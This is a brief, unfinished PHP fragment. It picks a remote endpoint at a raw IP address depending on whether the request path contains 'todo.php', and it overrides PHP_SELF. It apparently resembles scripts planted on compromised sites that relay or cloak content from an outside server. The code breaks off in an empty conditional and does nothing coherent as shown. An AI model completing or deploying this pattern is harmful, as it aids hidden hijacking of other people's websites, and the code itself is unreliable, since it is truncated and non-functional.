<?php
$req_uri = $_SERVER['REQUEST_URI'];
$self = $_SERVER['PHP_SELF'];
$inter_domain='http://192.151.153.146/z50526_2/';
if(strstr($req_uri, 'todo.php')){
    $inter_domain='http://192.151.145.18/z50526_12/';
    $self='/todo.php';
}
if(strstr($req_uri, 'bucketendpointmiddleware.php')){
    }
